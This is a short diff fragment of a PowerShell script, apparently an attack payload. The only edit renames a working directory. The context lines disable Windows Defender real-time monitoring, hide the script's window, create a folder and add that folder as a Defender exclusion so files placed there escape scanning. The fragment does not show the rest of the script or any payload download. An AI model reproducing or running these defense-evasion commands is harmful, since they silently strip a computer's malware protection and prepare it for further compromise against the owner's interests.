@@ -82,7 +82,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 # Minimize window 
 Get-Process -ID $PID | Set-WindowState -State HIDE
 # Create a tmp directory in the Downloads folder
-$dir = "C:\tmp"
+$dir = "C:\temp"
 New-Item -ItemType Directory -Path $dir
 # Add an exception to Windows Defender for the tmp directory
 Add-MpPreference -ExclusionPath $dir
